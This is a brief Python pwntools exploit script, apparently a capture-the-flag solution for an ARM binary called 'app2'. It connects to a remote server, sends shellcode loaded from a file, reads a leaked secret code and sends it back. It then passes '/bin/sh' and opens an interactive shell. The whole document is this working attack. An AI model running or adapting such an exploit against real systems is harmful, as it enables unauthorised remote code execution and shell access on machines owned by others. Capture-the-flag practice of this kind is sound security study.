#!/usr/bin/env python3
from pwn import *

context.clear(arch="arm")

#p = process(["qemu-arm-static", "-strace", "-L", "/usr/arm-linux-gnueabi", "app2"])
p = remote('15.165.92.159', 1234)

with open("a.shellcode", "rb") as f:
    p.write(f.read())

p.readuntil(b":>")
p.readuntil(b":>")

p.writeline(b"1")

print(p.readuntil(b"Secret code : "))
code = p.readline().strip()
print(p.readuntil(b"Code? :>"))


p.writeline(code)
p.writeline(b"/bin/sh")
p.interactive()
